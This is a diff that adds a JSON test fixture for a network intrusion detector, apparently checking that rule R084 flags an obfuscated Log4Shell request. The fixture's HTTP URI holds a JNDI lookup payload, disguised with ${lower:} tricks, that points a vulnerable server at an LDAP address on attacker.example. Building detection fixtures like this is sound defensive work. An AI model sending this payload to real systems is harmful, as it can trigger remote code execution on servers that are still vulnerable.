@@ -1,0 +1,17 @@
+﻿{
+  "name": "log4shell-obfuscated",
+  "records": [
+    {
+      "source": "10.0.0.25",
+      "destination": "198.51.100.10",
+      "protocol": "HTTP",
+      "destinationPort": 80,
+      "httpMethod": "GET",
+      "httpHost": "vulnerable.example",
+      "httpUri": "/search?q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.example/a}",
+      "httpUserAgent": "curl/8.0"
+    }
+  ],
+  "expectedMatches": ["R084"],
+  "expectedMinimumConfidence": 0.75
+}
